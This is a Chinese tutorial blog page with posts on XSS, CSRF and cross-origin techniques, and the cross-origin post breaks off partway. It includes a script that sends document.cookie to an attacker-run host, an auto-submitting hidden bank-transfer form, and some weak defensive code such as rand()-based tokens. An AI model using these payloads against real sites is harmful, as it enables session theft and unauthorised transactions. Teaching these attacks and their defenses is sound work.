      <a href="/2016/04/08/xssattack/" title="xss攻击" itemprop="url">xss攻击</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-04-08T08:21:08.000Z" itemprop="datePublished"> 发表于 2016-04-08</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>继续来研究一下网站安全的工作，这次要介绍的是xss，跨站脚本攻击(Cross Site Scripting)。</p>
<h3 id="什么是XSS？"><a href="#什么是XSS？" class="headerlink" title="什么是XSS？"></a>什么是XSS？</h3><p>XSS全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且<br>用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)<br>恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。<br>如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p>
<p>XSS攻击的漏洞主要有两种：</p>
<p>#####　1.DOM BASED XSS<br>基于网页DOM结构的攻击，也称作非持久性XSS攻击，因为这种攻击是一次性的，非持久型xss攻击要求用户<br>访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p>
<h6 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h6><p>网站A某页面使用GET传参的方法动态加载页面，例如url: www.a.com/a.php?para=1;<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> para = &lt;?php echo $_GET['para'];?&gt;;</span><br><span class="line">.....</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>在这个页面，把url里边的参数直接的引用到了页面内容(即DOM)里边，而没有做任何检查工作。<br>于是就有了XSS攻击的漏洞了。<br>接着用户B是这个网站的用户，黑客C发送了一条链接给他：<br>www.a.com/a.php?para=window.open(“www.b.com?para=”+document.cookie)<br>网站b是黑客搭建的用于接收这些被盗取的cookie，当用户点击该链接时，网站a就被注入了恶意脚本，<br>在自己的浏览器端执行了发送cookie的请求命令，这些恶意脚本并不会真正地影响服务器端的代码，<br>而仅仅是改变了用户加载到本地的页面内容，浏览器无法识别该内容被修改了照样执行，于是cookie就<br>被盗取了，只有在用户点击这一条被修改过的特定的链接时才会被攻击，因此称为非持久性攻击，攻击<br>原理是基于修改网页内容注入恶意脚本，因此也叫DOM Based XSS。<br>当然，一般的黑客并不会直接使用以上可读形式，而是将其转换成ASCII码，使得用户不可察觉该链接有危险。</p>
<h5 id="2-Stored-XSS"><a href="#2-Stored-XSS" class="headerlink" title="2.Stored XSS"></a>2.Stored XSS</h5><p>存储式XSS漏洞，也称作持久性攻击，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。<br>影响时间只要管理员不发现则一直存在，与上边没有改变服务器代码相比，Stored XSS的危险性更大，因为它<br>的攻击脚本已经改变了服务器端的内容了，任何用户只要访问了该内容就会收到攻击。</p>
<h6 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h6><p>网站a提供博客平台，用户可以自己写文章上传到服务器。<br>黑客b在自己的博文里边加入了恶意脚本：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(“www.b.com?para=”+<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>当用户d和用户c浏览黑客b的博文时，他们的cookie就被盗取了。因为该博文包含了盗取cookie的脚本，<br>在加载页面式该命令也被执行了。<br>只要管理员不发现没有删除这篇博文，那么只要有人访问就会触发攻击。所以危险比DOM Based XSS还要大。</p>
<h3 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h3><h5 id="建立完整的过滤体系"><a href="#建立完整的过滤体系" class="headerlink" title="建立完整的过滤体系"></a>建立完整的过滤体系</h5><p>对一切可变的，用户输入的东西都要进行过滤，假如有不能删减改变的则使用转义符号的方法替代特殊字符，<br>毕竟恶意代码也只是代码，破坏了代码结构就无法工作了。</p>
<p>Html encode<br>       假如某些情况下，我们不能对用户数据进行严格的过滤，那我们也需要对标签进行转换。</p>
<p><table border="1" cellspacing="0" cellpadding="0" width="675" style="background:#F2F9FF"><tbody><tr><td valign="top"><p align="left"><span style="color:#2E2E2E">less-than character (&lt;)</span></p></td><td valign="top"><p align="left"><span style="color:#2E2E2E">&amp;lt;</span></p></td></tr><tr><td valign="top"><p align="left"><span style="color:#2E2E2E">greater-than character (&gt;)</span></p></td><td valign="top"><p align="left"><span style="color:#2E2E2E">&amp;gt;</span></p></td></tr><tr><td valign="top"><p align="left"><span style="color:#2E2E2E">ampersand character (&amp;)</span></p></td><td valign="top"><p align="left"><span style="color:#2E2E2E">&amp;amp;</span></p></td></tr><tr><td valign="top"><p align="left"><span style="color:#2E2E2E">double-quote character (“)</span></p></td><td valign="top"><p align="left"><span style="color:#2E2E2E">&amp;quot;</span></p></td></tr><tr><td valign="top"><p align="left"><span style="color:#2E2E2E">space character( )</span></p></td><td valign="top"><p align="left"><span style="color:#2E2E2E">&amp;nbsp;</span></p></td></tr><tr><td valign="top"><p align="left"><span style="color:#2E2E2E">Any ASCII code character whose code is greater-than or equal to 0x80</span></p></td><td valign="top"><p align="left"><span style="color:#2E2E2E">&amp;#&lt;number&gt;, where &lt;number&gt; is the ASCII character value.</span></p></td></tr></tbody></table><br>这样即使黑客注入了脚本也会被转义成无效的字符串。比如用户输入：<script>window.location.href=”<a href="http://www.baidu.com”">http://www.baidu.com”</a>;</script>，保存后最终存储的会是：&lt;script&gt;window.location.href=&quot;<a href="http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。" target="_blank" rel="external">http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</a></p>
<p>过滤的工作要考虑全面，不仅在输入时过滤，输出时，从GET参数赋值时都要考虑过滤的问题，<br>没有漏洞就大大减少攻击的风险。</p>
<p>补充：<br><a href="http://lobert.iteye.com/blog/2164741" target="_blank" rel="external">这篇博客</a>提到了一个配置可以阻止浏览器通过js来获取cookie的行为。<br>从而防止黑客盗取用户的cookie。这里就引用一下：</p>
<p>HttpOnly防止劫取Cookie<br>HttpOnly最早由微软提出，至今已经成为一个标准。浏览器将禁止页面的Javascript访问带有HttpOnly属性的Cookie。目前主流浏览器都支持，HttpOnly解决是XSS后的Cookie支持攻击。</p>
<p>我们来看下百度有没有使用。<br>未登录时的Cookie信息：<br><img src="http://img.blog.csdn.net/20141205152610171"><br>可以看到，所有Cookie都没有设置HttpOnly，现在我登录下<br><img src="http://img.blog.csdn.net/20141205153514671"><br>发现在个叫BDUSS的Cookie设置了HttpOnly。可以猜测此Cookie用于认证。<br>下面我用PHP来实现下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">header(<span class="string">"Set-Cookie: cookie1=test1;"</span>);  </span><br><span class="line">header(<span class="string">"Set-Cookie: cookie2=test2;httponly"</span>,<span class="keyword">false</span>);  </span><br><span class="line">  </span><br><span class="line">setcookie(<span class="string">'cookie3'</span>,<span class="string">'test3'</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">false</span>);  </span><br><span class="line">setcookie(<span class="string">'cookie4'</span>,<span class="string">'test4'</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">true</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">&lt;script&gt;  </span><br><span class="line">    alert(document.cookie);  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://img.blog.csdn.net/20141205154702687"><br>结果：<br><img src="http://img.blog.csdn.net/20141205154518194"><br>js只能读到没有HttpOnly标识的Cookie1,3,4，而有保护的2则不能被读取。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>XSS攻击类似于sql注入攻击，虽然防御简单但是往往开发时总会疏忽一两处地方没有做好<br>安全过滤的工作由此给了黑客一个攻击的入口了，可以适当地使用一些查漏洞的软件来检查<br>自己的项目是否有漏洞。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/网站安全/">网站安全</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/04/07/csrfattack/" title="CSRF跨域伪造攻击" itemprop="url">CSRF跨域伪造攻击</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-04-07T11:33:24.000Z" itemprop="datePublished"> 发表于 2016-04-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>上年去面试时被问到跨域攻击的方式及防范方法，只知道攻击方式却不知道防范方式，<br>所以决定来学一下。</p>
<h4 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h4><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。<br>也就是在用户会话下对某个CGI做一些GET/POST的事情——这些事情用户未必知道和愿意做，你可以把它想做HTTP会话劫持。</p>
<h4 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h4><p>参考<a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">这篇博客</a>后,可以看到<br><img src="http://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg"><br>恶意网站通过在自己网站写伪造的请求，并在用户访问恶意网站的同时发送请求，这样正常网站就<br>误以为该请求来自与用户，从而执行了请求。</p>
<h6 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1."></a>示例 1.</h6><p>银行网站A，它以GET请求来完成银行转账的操作，如：<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000" target="_blank" rel="external">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a><br>危险网站B，它里面有一段HTML的代码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">'http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000'</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>首先，你登录了银行网站A，然后访问危险网站B，在访问B时由于B上边的恶意代码，浏览器在加载<br>img的src时会发送一个请求(原本是请求图片内容，结果被利用了)，而由于请求是通过用户本地浏<br>览器发送的，网站A就误以为该请求时用户自己发出的正常请求，所以就执行了，然后用户账号就被<br>扣了1000块了。</p>
<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2."></a>示例2.</h5><p>以上攻击基于A网站使用GET传参数，但是实际应用中一般使用POST保安全，然而一样是有攻击方式的</p>
<p>网站A改造成POST传参<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　　　session_start();</span><br><span class="line">　　　　<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'toBankId'</span>] &amp;&amp;　<span class="keyword">isset</span>($_POST[<span class="string">'money'</span>]))</span><br><span class="line">　　　　&#123;</span><br><span class="line">　　　　    buy_stocks($_POST[<span class="string">'toBankId'</span>],　$_POST[<span class="string">'money'</span>]);</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>网站B对应改成针对post的攻击<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">　　&lt;head&gt;</span><br><span class="line">　　　　&lt;script type="text/javascript"&gt;</span><br><span class="line">　　　　　　function steal()</span><br><span class="line">　　　　　　&#123;</span><br><span class="line">          　　　　 iframe = document.frames["steal"];</span><br><span class="line">　　     　　      iframe.document.Submit("transfer");</span><br><span class="line">　　　　　　&#125;</span><br><span class="line">　　　　&lt;/script&gt;</span><br><span class="line">　　&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">　　&lt;body onload=<span class="string">"steal()"</span>&gt;</span><br><span class="line">　　　　&lt;iframe name="steal" display="none"&gt;</span><br><span class="line">　　　　　　&lt;form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php"&gt;</span><br><span class="line">　　　　　　　　&lt;input type="hidden" name="toBankId" value="11"&gt;</span><br><span class="line">　　　　　　　　&lt;input type="hidden" name="money" value="1000"&gt;</span><br><span class="line">　　　　　　&lt;/form&gt;</span><br><span class="line">　　　　&lt;/iframe&gt;</span><br><span class="line">　　&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>这样B网站通过iframe构建一个form来提交表单，同样骗过了浏览器和A网站，达到了跨域攻击的目的</p>
<p>总结：<br>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</p>
<h4 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h4><p>从上边的例子可以看到要防御CSRF攻击，可以从客户端和服务器端两边入手。</p>
<p>(1)增加伪随机数<br>使用伪随机数是现在比较简单和普遍的做法，即使是GET这样不安全的方法也因为伪随机数的引入而变得<br>可采用。其原理就是在传参数时添加多一项随机数来验证该请求是否来源于真实用户，而不仅仅只需要<br>执行逻辑业务的参数。<br>服务器端在用户访问/登录时通过session/cookie保存一个随机数用户后续的验证。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　　　<span class="comment">//构造加密的Cookie信息</span></span><br><span class="line">　　　　$value = rand(<span class="number">10000</span>,<span class="number">99999</span>);</span><br><span class="line">　　　　setcookie(”token”, $value, time()+<span class="number">3600</span>);<span class="comment">//或者session("token",$value)</span></span><br><span class="line">　　<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后客户端提交表单的同时把随机数也传过去<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　　　$hash = md5($_COOKIE[<span class="string">'token'</span>]);<span class="comment">//或者$_SESSION['token']</span></span><br><span class="line">　　?&gt;</span><br><span class="line">　　&lt;form method=”POST” action=”transfer.php”&gt;</span><br><span class="line">　　　　&lt;input type=”text” name=”toBankId”&gt;</span><br><span class="line">　　　　&lt;input type=”text” name=”money”&gt;</span><br><span class="line">　　　　&lt;input type=”hidden” name=”hash” value=”&lt;?=$hash;?&gt;”&gt; </span><br><span class="line">　　　　&lt;input type=”submit” name=”submit” value=”Submit”&gt;</span><br><span class="line">　　&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
<p>服务器端受到请求就会进行随机数验证才通过请求。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　      <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'hash'</span>])) &#123;</span><br><span class="line">     　　      $hash = md5($_COOKIE[<span class="string">'token'</span>]);<span class="comment">//或者md5($_SESSION['token'])</span></span><br><span class="line">          　　 <span class="keyword">if</span>($_POST[<span class="string">'hash'</span>] == $hash) &#123;</span><br><span class="line">               　　 doJob();</span><br><span class="line">　　           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">　　　　　　　　<span class="comment">//...</span></span><br><span class="line">          　　 &#125;</span><br><span class="line">　　      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">　　　　　　<span class="comment">//...</span></span><br><span class="line">　　      &#125;</span><br><span class="line">      <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这样就能确认该请求是真实用户发出来的了。一般而言这种方法就能拦截大部分的CSRF攻击。<br>但是不排除恶意网站会盗取cookie或者强硬破解随机数的做法。</p>
<p>(2)验证码<br>在用户需要提交请求的地方都设置需要填入验证码才可以的方法虽然有效但是过于麻烦，可以<br>用于一些安全需求很高的地方。</p>
<p>(3)前一页的链接<br>服务器端是可以通过sever对象的referer来知道请求时来源于哪个网站哪个页面链接的，一般网站都是同<br>主域的，所以也可以通过查询用户前一页，即从哪里发送请求过来的方法验证请求是否来源安全，<br>然而这种方法可以通过伪造修改httprequest来破解。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"www.playhack.net"</span>, $_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">     do_something();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"Malicious Request!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>CSRF攻击很简单就能实现，因此防御方式也是比较多和实用的，在平常做项目时<br>也要多留意一下这些方面不要留下漏洞给人钻，安全问题虽然我现在还没有怎么研究<br>但是一定是一个不可避免的课题。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/网站安全/">网站安全</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/03/31/crossfield/" title="网页的跨域访问处理" itemprop="url">网页的跨域访问处理</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-03-31T13:00:50.000Z" itemprop="datePublished"> 发表于 2016-03-31</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>最近被问到会不会跨域访问时自己只在以前做项目时用过php的curl和jsonp，然后就没有了，<br>而且两者也只是只会用并没有深入研究过，所以这次来探讨一下web端跨域访问的方法。</p>
<h3 id="关于跨域"><a href="#关于跨域" class="headerlink" title="关于跨域"></a>关于跨域</h3><p>所谓跨域就是在一个网站的网页访问另一个网站(甚至是同一个服务器不同端口)的接口或者页面，一般情况下，浏览器是禁止<br>这种行为的，为了安全，至于有哪些危险就是另一个课题了，可以看看<a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">关于CSRF攻击</a><br>但是在我们的开发时有时会遇上一定要进行跨域访问的情况，那么要如何进行跨域访问呢？<br>在网上查阅了一些资料总结起来有一下几种：</p>
<h6 id="1）document-domain-iframe的设置"><a href="#1）document-domain-iframe的设置" class="headerlink" title="1）document.domain+iframe的设置"></a>1）document.domain+iframe的设置</h6><h6 id="2）动态创建script，即jsonp"><a href="#2）动态创建script，即jsonp" class="headerlink" title="2）动态创建script，即jsonp"></a>2）动态创建script，即jsonp</h6><h6 id="3）利用iframe和location-hash"><a href="#3）利用iframe和location-hash" class="headerlink" title="3）利用iframe和location.hash"></a>3）利用iframe和location.hash</h6><h6 id="4）window-name实现的跨域数据传输"><a href="#4）window-name实现的跨域数据传输" class="headerlink" title="4）window.name实现的跨域数据传输"></a>4）window.name实现的跨域数据传输</h6><h6 id="5）使用HTML5-postMessage"><a href="#5）使用HTML5-postMessage" class="headerlink" title="5）使用HTML5 postMessage"></a>5）使用HTML5 postMessage</h6><h6 id="6）利用flash"><a href="#6）利用flash" class="headerlink" title="6）利用flash"></a>6）利用flash</h6><h6 id="7）后台代理"><a href="#7）后台代理" class="headerlink" title="7）后台代理"></a>7）后台代理</h6><h6 id="8）跨域资源共享（CORS）"><a href="#8）跨域资源共享（CORS）" class="headerlink" title="8）跨域资源共享（CORS）"></a>8）跨域资源共享（CORS）</h6><p>接下来就一点点介绍。</p>
<h3 id="1-document-domain-iframe的设置"><a href="#1-document-domain-iframe的设置" class="headerlink" title="1. document.domain+iframe的设置"></a>1. document.domain+iframe的设置</h3><p>注意，这种方式只适合主域相同而子域不同的情况。<br>首先我们有两个页面，一个是发起请求的 www.a.com/a.html,一个是被请求的 script.a.com/b.html,<br>在两个文件里都加上一句：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain = <span class="string">"a.com"</span>;</span><br></pre></td></tr></table></figure></p>
<p>然后在a.html建立一个iframe来引用b.html，这时就可以调用b.html的内容了，在没有加上面一句时，<br>即使用了iframe也不能与b.html进行交互<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">"b"</span> src=<span class="string">"http://script.a.com/b.html"</span> frameborder=<span class="string">"on"</span>&gt;&lt;/iframe&gt;<span class="comment">//搭建iframe</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIframeDocument</span>(<span class="params">id</span>)</span>&#123; <span class="comment">// 通过id获取b的内容</span></span><br><span class="line">    returen <span class="built_in">document</span>.getElementById(id).contentDocument || <span class="built_in">document</span>.getElementById(id).document;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>补充：问题：<br>   1、安全性，当一个站点（b.a.com）被攻击后，另一个站点（c.a.com）会引起安全漏洞。<br>   2、如果一个页面中引入多个iframe，要想能够操作所有iframe，必须都得设置相同domain。</p>
<h3 id="2-动态创建script，即jsonp"><a href="#2-动态创建script，即jsonp" class="headerlink" title="2. 动态创建script，即jsonp"></a>2. 动态创建script，即jsonp</h3><p>虽然浏览器禁止了跨域访问，但是并不禁止跨域加载js文件，实际上，具有src属性的标签都具有<br>跨域访问的能力，所以以前的程序员就想到这种特性来绕开同源策略。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);  </span><br><span class="line">script.src = <span class="string">"http://aa.xx.com/js/*.js"</span>;  </span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure>
<p>常用的方法是jsonp，先看看百度对jsonp的解释(对不起我没用google，改hosts上不了steam啊)，</p>
<p>“JSONP(JSON with Padding)是JSON的 一种“使用模式”，可用于解决主流浏览器的跨域数据访问的问题。<br>由于同源策略，一般来说位于 server1.example.com 的网页无法与不是 server1.example.com的服务器<br>沟通，而 HTML 的<code>&lt;script&gt;</code> 元素是一个例外。利用 <code>&lt;script&gt;</code> 元素的这个开放策略，网页可以得到从其他<br>来源动态产生的 JSON 资料，而这种使用模式就是所谓的 JSONP。用 JSONP 抓到的资料并不是 JSON，而是<br>任意的JavaScript，用 JavaScript 直译器执行而不是用 JSON 解析器解析。”</p>
<p>使用jsonp需要同时使用回调函数，实际上我们利用jsonp来通信就是通过回调函数的参数来实现的。<br>在发送jsonp的请求的同时告诉对方回调函数的名字让目标页面来调用从而达到传输参数的目的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CallWebServiceByJsonp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123; <span class="comment">//通过ajax来发送请求</span></span><br><span class="line">            type: <span class="string">"GET"</span>,</span><br><span class="line">            cache: <span class="literal">false</span>,</span><br><span class="line">            url: <span class="string">"http://servername/webservice/GetInfo"</span>, <span class="comment">//目标链接</span></span><br><span class="line">            data: &#123;token:<span class="string">'axegher44ghg435'</span>&#125;,</span><br><span class="line">            dataType: <span class="string">"jsonp"</span>, <span class="comment">//说明这是一个jsonp请求</span></span><br><span class="line">            jsonp: <span class="string">"callback"</span>, <span class="comment">//指定回调函数</span></span><br><span class="line">             success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(data)</span><br><span class="line">                    &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//处理data</span></span><br><span class="line">    alert(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>别请求页面，这里用php<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//服务端返回JSON数据  </span></span><br><span class="line">$arr=array(<span class="string">'a'</span>=&gt;<span class="number">1</span>,<span class="string">'b'</span>=&gt;<span class="number">2</span>,<span class="string">'c'</span>=&gt;<span class="number">3</span>,<span class="string">'d'</span>=&gt;<span class="number">4</span>,<span class="string">'e'</span>=&gt;<span class="number">5</span>);  </span><br><span class="line">$result=json_encode($arr);  </span><br><span class="line"><span class="comment">//echo $_GET['callback'].'("Hello,World!")';  </span></span><br><span class="line"><span class="comment">//echo $_GET['callback']."($result)";  </span></span><br><span class="line"><span class="comment">//动态执行回调函数  </span></span><br><span class="line">$callback=$_GET[<span class="string">'callback'</span>];  </span><br><span class="line">echo $callback.<span class="string">"($result)"</span>;  <span class="comment">//$result就是通信返回数据。</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>这样就能实现跨域通信了。</p>
<h3 id="3-利用iframe和location-hash"><a href="#3-利用iframe和location-hash" class="headerlink" title="3. 利用iframe和location.hash"></a>3. 利用iframe和location.hash</h3><p>这个主要得原理是通过location.hash传递参数,什么是location.hash呢？w3c的描述如下：</p>
<h5 id="hash-属性是一个可读可写的字符串，该字符串是-URL-的锚部分（从-号开始的部分）。"><a href="#hash-属性是一个可读可写的字符串，该字符串是-URL-的锚部分（从-号开始的部分）。" class="headerlink" title="hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。"></a>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</h5><p>例如：<a href="http://example.com:1234/test.htm#part2" target="_blank" rel="external">http://example.com:1234/test.htm#part2</a><br>此时hash值就是#part2了（包括#号），获取hash的方法直接用location.hash</p>
